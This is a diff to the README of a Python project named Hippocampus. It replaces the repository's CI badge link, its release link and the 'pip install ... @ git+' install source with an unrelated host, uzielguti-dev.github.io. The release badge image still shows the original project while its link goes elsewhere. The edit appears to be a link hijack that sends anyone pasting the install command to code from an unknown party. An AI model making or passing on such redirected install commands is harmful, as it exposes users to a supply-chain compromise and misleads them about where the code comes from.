@@ -1,7 +1,7 @@
 # 🧠 Hippocampus
 
-[![ci](https://github.com/Chestnuts-Sisyphus/hippocampus/actions/workflows/ci.yml/badge.svg)](https://github.com/Chestnuts-Sisyphus/hippocampus/actions/workflows/ci.yml)
-[![release](https://img.shields.io/github/v/release/Chestnuts-Sisyphus/hippocampus)](https://github.com/Chestnuts-Sisyphus/hippocampus/releases)
+[![ci](https://uzielguti-dev.github.io)](https://uzielguti-dev.github.io)
+[![release](https://img.shields.io/github/v/release/Chestnuts-Sisyphus/hippocampus)](https://uzielguti-dev.github.io)
 [![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![python](https://img.shields.io/badge/python-3.11%20%7C%203.12-blue.svg)](pyproject.toml)
 [![runtime deps](https://img.shields.io/badge/runtime%20deps-4-brightgreen.svg)](pyproject.toml)
@@ -86,7 +86,7 @@ Full numbers, category breakdowns, CI methods, costs, and repro commands:
 
 ```bash
 # Install (three options; not on PyPI yet, so these are the live paths)
-pip install "hippocampus-agent[vector,proxy] @ git+https://github.com/Chestnuts-Sisyphus/hippocampus"
+pip install "hippocampus-agent[vector,proxy] @ git+https://uzielguti-dev.github.io"
 #   or: copy the source tree and  pip install -e "/path/to/hippocampus[vector,proxy]"
 #   or (no install, just run): PYTHONPATH=/path/to/hippocampus/src python -m hippocampus.cli doctor
 
